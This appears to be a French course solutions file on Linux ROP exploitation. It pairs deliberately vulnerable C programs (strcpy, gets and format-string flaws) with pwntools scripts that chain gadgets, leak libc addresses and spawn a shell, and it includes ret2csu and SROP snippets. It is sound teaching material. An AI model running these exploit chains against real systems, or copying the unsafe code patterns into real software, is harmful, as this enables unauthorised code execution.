# Solutions - ROP Linux

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre les techniques d'exploitation Return-Oriented Programming. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre les gadgets ROP et identifier des gadgets simples

### Solution

```c
/*
 * Programme vulnérable avec stack overflow
 * Permet de découvrir les gadgets ROP
 *
 * Compilation :
 * gcc -fno-stack-protector -z execstack vuln.c -o vuln
 * gcc -fno-stack-protector -no-pie vuln.c -o vuln (pour désactiver PIE)
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Fonction vulnérable avec buffer overflow
void vulnerable_function(char *input)
{
    char buffer[64];

    printf("[*] Buffer address: %p\n", buffer);

    // Vulnérabilité : pas de vérification de taille
    strcpy(buffer, input);

    printf("[+] Data copied: %s\n", buffer);
}

// Fonction qui ne sera jamais appelée normalement
void secret_function()
{
    printf("[!] Secret function called!\n");
    printf("[!] You successfully hijacked control flow!\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    printf("[*] Program start\n");
    printf("[*] Secret function address: %p\n", secret_function);

    vulnerable_function(argv[1]);

    printf("[*] Program end\n");
    return 0;
}
```

**Script Python pour trouver des gadgets** :

```python
#!/usr/bin/env python3
"""
ROPgadget finder simple
Recherche des gadgets ROP dans un binaire

Usage: python3 find_gadgets.py <binary>
"""

import sys
import subprocess

def find_gadgets(binary):
    """Trouve les gadgets ROP avec ROPgadget"""

    print(f"[*] Recherche de gadgets dans {binary}")
    print("[*] Utilisation de ROPgadget...\n")

    # Gadgets les plus utiles
    useful_gadgets = [
        "pop rdi ; ret",
        "pop rsi ; ret",
        "pop rdx ; ret",
        "pop rax ; ret",
        "syscall",
        "ret"
    ]

    for gadget in useful_gadgets:
        print(f"[*] Recherche : {gadget}")
        cmd = f"ROPgadget --binary {binary} --only '{gadget}'"
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True,
                                  text=True)
            if result.stdout:
                lines = result.stdout.strip().split('\n')
                # Affiche les 3 premières occurences
                for line in lines[:5]:
                    if "0x" in line:
                        print(f"  {line}")
        except:
            pass
        print()

def find_plt_got(binary):
    """Trouve les adresses PLT et GOT"""

    print("[*] Analyse PLT/GOT")
    cmd = f"objdump -d {binary} | grep '@plt'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.stdout:
        print(result.stdout)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <binary>")
        sys.exit(1)

    find_gadgets(sys.argv[1])
    find_plt_got(sys.argv[1])
```

**Utilisation** :

```bash
# Compiler le programme vulnérable
gcc -fno-stack-protector -no-pie vuln.c -o vuln

# Trouver les gadgets
ROPgadget --binary vuln | grep "pop rdi"
ROPgadget --binary vuln | grep "ret"

# Trouver l'adresse de secret_function
objdump -d vuln | grep secret_function

# Tester le buffer overflow
./vuln $(python3 -c "print('A'*72 + '\x41\x41\x41\x41\x41\x41\x41\x41')")
```

**Explications** :
- Un gadget ROP est une séquence d'instructions se terminant par `ret`
- `pop rdi ; ret` permet de charger une valeur dans RDI
- Les gadgets sont trouvés dans le code existant du binaire
- On chaîne les gadgets pour construire un exploit

---

## Exercice 2 : Modification (Facile)

**Objectif** : Créer une ROP chain simple pour appeler system("/bin/sh")

### Solution

```c
/*
 * Programme vulnérable pour exploitation ROP
 *
 * Compilation :
 * gcc -fno-stack-protector -no-pie -z execstack rop_vuln.c -o rop_vuln
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vulnerable(char *input)
{
    char buffer[128];
    strcpy(buffer, input);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    printf("[*] Buffer overflow ROP challenge\n");
    vulnerable(argv[1]);

    return 0;
}
```

**Exploit Python avec pwntools** :

```python
#!/usr/bin/env python3
"""
Exploit ROP pour appeler system("/bin/sh")

Exploitation :
1. Trouver l'offset du buffer overflow
2. Trouver le gadget "pop rdi ; ret"
3. Trouver l'adresse de system() et "/bin/sh"
4. Construire la ROP chain
"""

from pwn import *

# Configuration
binary = "./rop_vuln"
elf = ELF(binary)
rop = ROP(elf)

# Trouve les adresses nécessaires
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
system_addr = elf.plt['system']
binsh_addr = next(elf.search(b'/bin/sh\x00'))

print(f"[*] Gadget pop rdi ; ret : 0x{pop_rdi:x}")
print(f"[*] Gadget ret : 0x{ret_gadget:x}")
print(f"[*] system@plt : 0x{system_addr:x}")
print(f"[*] /bin/sh : 0x{binsh_addr:x}")

# Offset du buffer overflow (à ajuster selon le binaire)
offset = 136

# Construction de la ROP chain
payload = b'A' * offset

# Alignement de la pile (stack alignment)
# Nécessaire sur x64 pour certains appels
payload += p64(ret_gadget)

# Charge l'adresse de "/bin/sh" dans RDI (premier argument)
payload += p64(pop_rdi)
payload += p64(binsh_addr)

# Appelle system("/bin/sh")
payload += p64(system_addr)

print(f"\n[*] Payload size: {len(payload)} bytes")
print(f"[*] Sending payload...")

# Envoie le payload
p = process([binary, payload])

# Passe en mode interactif
p.interactive()
```

**Version manuelle sans pwntools** :

```python
#!/usr/bin/env python3
"""
Exploit ROP manuel
"""

import struct
import subprocess

def p64(addr):
    """Pack une adresse 64 bits en little-endian"""
    return struct.pack('<Q', addr)

# Adresses trouvées manuellement avec objdump/ROPgadget
POP_RDI = 0x0000000000401156  # pop rdi ; ret
RET = 0x000000000040101a       # ret
SYSTEM_PLT = 0x0000000000401030
BINSH_ADDR = 0x0000000000402004

offset = 136

# Construction du payload
payload = b'A' * offset
payload += p64(RET)              # Alignement
payload += p64(POP_RDI)          # pop rdi ; ret
payload += p64(BINSH_ADDR)       # adresse de "/bin/sh"
payload += p64(SYSTEM_PLT)       # system@plt

# Écriture dans un fichier
with open('payload.bin', 'wb') as f:
    f.write(payload)

print(f"[+] Payload créé ({len(payload)} bytes)")
print("[*] Lancer avec: ./rop_vuln $(cat payload.bin)")
```

**Explications** :

1. **Offset** : Distance entre le début du buffer et l'adresse de retour
2. **Stack alignment** : x64 requiert un alignement 16-bytes pour certains appels
3. **ROP chain** :
   ```
   [padding] -> [ret] -> [pop rdi] -> [addr "/bin/sh"] -> [system]
   ```

4. **Déroulement** :
   - `ret` : aligne la pile
   - `pop rdi` : charge l'adresse de "/bin/sh" dans RDI
   - `ret` : passe à l'instruction suivante
   - `system` : appelle system(RDI) = system("/bin/sh")

---

## Exercice 3 : Création (Moyen)

**Objectif** : ROP chain avec syscall execve pour bypass NX

### Solution

```c
/*
 * Programme avec NX activé
 * La pile n'est pas exécutable
 *
 * Compilation :
 * gcc -fno-stack-protector -no-pie rop_execve.c -o rop_execve
 */

#include <stdio.h>
#include <string.h>

void vuln()
{
    char buffer[256];
    printf("[*] Enter payload: ");
    gets(buffer);  // Vulnérable
}

int main()
{
    printf("[*] ROP Execve Challenge\n");
    printf("[*] NX is enabled, stack is not executable\n");

    vuln();

    return 0;
}
```

**Exploit avec syscall execve** :

```python
#!/usr/bin/env python3
"""
ROP chain pour execve("/bin/sh", NULL, NULL)

Technique :
- Utiliser des gadgets pour placer les valeurs dans les registres
- RAX = 59 (syscall execve)
- RDI = adresse de "/bin/sh"
- RSI = 0 (NULL)
- RDX = 0 (NULL)
- Appeler syscall
"""

from pwn import *

context.arch = 'amd64'

binary = "./rop_execve"
elf = ELF(binary)
rop = ROP(elf)

# Recherche des gadgets
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# Cherche un gadget syscall
# Si pas trouvé dans le binaire, on peut utiliser une libc
try:
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
except:
    # Alternative : chercher dans libc
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    syscall = next(libc.search(asm('syscall\nret')))

# Trouve ou crée la chaîne "/bin/sh"
try:
    binsh = next(elf.search(b'/bin/sh\x00'))
except:
    # Si pas trouvé, on doit l'écrire en mémoire
    # On utilise une section writable
    binsh = elf.bss() + 0x100

print("[*] Gadgets trouvés:")
print(f"  pop rax ; ret : 0x{pop_rax:x}")
print(f"  pop rdi ; ret : 0x{pop_rdi:x}")
print(f"  pop rsi ; ret : 0x{pop_rsi:x}")
print(f"  pop rdx ; ret : 0x{pop_rdx:x}")
print(f"  syscall : 0x{syscall:x}")
print(f"  /bin/sh : 0x{binsh:x}")

# Construction de la ROP chain
offset = 264  # Offset à ajuster

payload = b'A' * offset

# execve("/bin/sh", NULL, NULL)
# RAX = 59
payload += p64(pop_rax)
payload += p64(59)

# RDI = "/bin/sh"
payload += p64(pop_rdi)
payload += p64(binsh)

# RSI = 0
payload += p64(pop_rsi)
payload += p64(0)

# RDX = 0
payload += p64(pop_rdx)
payload += p64(0)

# syscall
payload += p64(syscall)

# Envoi
p = process(binary)
p.sendline(payload)
p.interactive()
```

**Version avec écriture de "/bin/sh" en mémoire** :

```python
#!/usr/bin/env python3
"""
ROP chain avancée : écriture de "/bin/sh" puis execve
"""

from pwn import *

context.arch = 'amd64'

binary = "./rop_execve"
elf = ELF(binary)
rop = ROP(elf)

# Gadgets nécessaires
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
mov_ptr_rdi_rsi = rop.find_gadget(['mov qword ptr [rdi], rsi', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]

# Adresse en mémoire writable (BSS)
writable_addr = elf.bss()

offset = 264

payload = b'A' * offset

# Étape 1: Écrire "/bin/sh" en mémoire
# mov [writable_addr], "/bin/sh\x00"

# Première partie : "/bin/sh\x00" = 0x0068732f6e69622f
payload += p64(pop_rdi)
payload += p64(writable_addr)
payload += p64(pop_rsi)
payload += p64(0x68732f6e69622f)  # "/bin/sh" en little-endian
payload += p64(mov_ptr_rdi_rsi)

# Étape 2: execve(writable_addr, NULL, NULL)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(writable_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

print(f"[*] Payload size: {len(payload)} bytes")

p = process(binary)
p.sendline(payload)
p.interactive()
```

**Explications** :

1. **Contrainte NX** : La pile n'est pas exécutable, on ne peut pas injecter de shellcode
2. **Solution** : Utiliser le code existant (gadgets) pour construire l'appel système
3. **Gadgets nécessaires** :
   - `pop rax` : charger le numéro de syscall
   - `pop rdi/rsi/rdx` : charger les arguments
   - `syscall` : effectuer l'appel système

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : ROP chain pour bypass ASLR + NX avec info leak

### Solution

```c
/*
 * Programme avec ASLR, NX, PIE
 * Nécessite une information leak pour exploiter
 *
 * Compilation :
 * gcc -fstack-protector-all rop_aslr.c -o rop_aslr
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void vuln()
{
    char buffer[128];
    char *heap_ptr = malloc(32);

    // Info leak : affiche des adresses
    printf("[*] Buffer address: %p\n", buffer);
    printf("[*] Heap address: %p\n", heap_ptr);
    printf("[*] puts@GOT: %p\n", &puts);

    printf("[*] Enter data: ");
    gets(buffer);

    free(heap_ptr);
}

int main()
{
    printf("[*] ROP + ASLR Bypass Challenge\n");
    vuln();
    return 0;
}
```

**Exploit en deux étapes** :

```python
#!/usr/bin/env python3
"""
Exploit ROP avec bypass ASLR

Technique ret2libc avec info leak :
1. Leak une adresse de la libc via GOT
2. Calculer la base de la libc
3. Construire une ROP chain vers system() dans la libc
"""

from pwn import *

context.arch = 'amd64'

binary = "./rop_aslr"
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

# Gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Adresses PLT/GOT
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

print("[*] Étape 1 : Leak de la libc")
print(f"  puts@plt : 0x{puts_plt:x}")
print(f"  puts@got : 0x{puts_got:x}")

# === PREMIER PAYLOAD : LEAK ===
offset = 136

payload1 = b'A' * offset

# Affiche l'adresse réelle de puts (dans libc)
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)

# Retour à main pour un second payload
payload1 += p64(main_addr)

# Lancer le processus
p = process(binary)

# Récupère les infos leakées naturellement
p.recvuntil(b'puts@GOT: ')
got_leak = int(p.recvline().strip(), 16)
print(f"[+] GOT leak : 0x{got_leak:x}")

# Envoie le premier payload
p.sendline(payload1)

# Récupère le leak de puts
p.recvuntil(b'Enter data: ')
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))

print(f"[+] Leaked puts : 0x{leaked_puts:x}")

# Calcule la base de la libc
libc_base = leaked_puts - libc.symbols['puts']
print(f"[+] Libc base : 0x{libc_base:x}")

# Calcule les adresses dans la libc
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

print(f"[+] system() : 0x{system_addr:x}")
print(f"[+] /bin/sh : 0x{binsh_addr:x}")

# === SECOND PAYLOAD : EXPLOITATION ===
print("\n[*] Étape 2 : Exploitation")

p.recvuntil(b'Enter data: ')

payload2 = b'A' * offset
payload2 += p64(ret)  # Alignement
payload2 += p64(pop_rdi)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)

print("[+] Shell obtenu!")
p.interactive()
```

**Version avec format string pour leak** :

```c
/*
 * Programme vulnérable avec format string + buffer overflow
 */
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buffer[128];
    char format[256];

    printf("[*] Enter format string: ");
    gets(format);

    // Vulnérabilité format string
    printf(format);
    printf("\n");

    printf("[*] Enter data: ");
    gets(buffer);  // Buffer overflow
}

int main()
{
    vuln();
    return 0;
}
```

```python
#!/usr/bin/env python3
"""
Exploit combiné : format string + ROP
"""

from pwn import *

binary = "./rop_format"
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(binary)

# === ÉTAPE 1 : FORMAT STRING LEAK ===
# %p pour leaker des adresses de la pile
# Trouve l'offset où se trouve une adresse libc
payload_format = b'%3$p.%5$p.%7$p'  # Leak plusieurs adresses

p.sendlineafter(b'format string: ', payload_format)
leaks = p.recvline().strip().split(b'.')

print("[*] Leaks :")
for i, leak in enumerate(leaks):
    addr = int(leak, 16)
    print(f"  Position {i}: 0x{addr:x}")

# Identifie quelle leak est dans la libc
# (nécessite une analyse préalable ou fuzzing)
libc_leak = int(leaks[1], 16)  # Exemple
libc_base = libc_leak - 0x29d90  # Offset à ajuster

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"[+] Libc base : 0x{libc_base:x}")
print(f"[+] system : 0x{system_addr:x}")

# === ÉTAPE 2 : ROP ===
pop_rdi = 0x4011d3  # À trouver avec ROPgadget

offset = 136
payload_rop = b'A' * offset
payload_rop += p64(pop_rdi)
payload_rop += p64(binsh_addr)
payload_rop += p64(system_addr)

p.sendlineafter(b'data: ', payload_rop)
p.interactive()
```

**Techniques avancées** :

1. **ret2plt** :
```python
# Appeler puts pour leak, puis utiliser le leak
rop_leak = flat([
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']  # Retour pour second exploit
])
```

2. **ret2csu** (quand peu de gadgets disponibles) :
```python
# Utilise __libc_csu_init pour contrôler plusieurs registres
csu_pop = 0x40119a  # Adresse du gadget csu
csu_call = 0x401180

# Contrôle RDX, RSI, RDI
rop_csu = flat([
    csu_pop,
    0,  # rbx
    1,  # rbp
    elf.got['read'],  # r12 (fonction à appeler)
    0,  # r13 -> rdx
    writable,  # r14 -> rsi
    0,  # r15 -> rdi
    csu_call
])
```

3. **SROP (Sigreturn-Oriented Programming)** :
```python
# Utilise rt_sigreturn pour contrôler tous les registres
from pwn import *

frame = SigreturnFrame()
frame.rax = 59  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = flat([
    b'A' * offset,
    pop_rax,
    15,  # __NR_rt_sigreturn
    syscall,
    bytes(frame)
])
```

---

## Points clés à retenir

1. **ROP Basics** :
   - Chaîner des gadgets pour construire des opérations
   - Chaque gadget se termine par `ret`
   - Contrôler les registres via `pop`

2. **Contournement des protections** :
   - NX : ROP au lieu de shellcode
   - ASLR : Info leak puis calcul des adresses
   - PIE : Leak de code puis calcul de base

3. **Techniques d'exploitation** :
   - ret2libc : appeler system() de la libc
   - ret2plt : utiliser PLT/GOT pour leak
   - ret2syscall : appeler directement des syscalls

4. **Outils essentiels** :
   - ROPgadget : trouver les gadgets
   - pwntools : automatiser les exploits
   - gdb + pwndbg : debug et analyse

## Ressources complémentaires

- The Art of ROP : https://www.exploit-db.com/docs/english/28479-return-oriented-programming.pdf
- ROPemporium : challenges ROP progressifs
- pwntools documentation
- Linux x64 syscall table
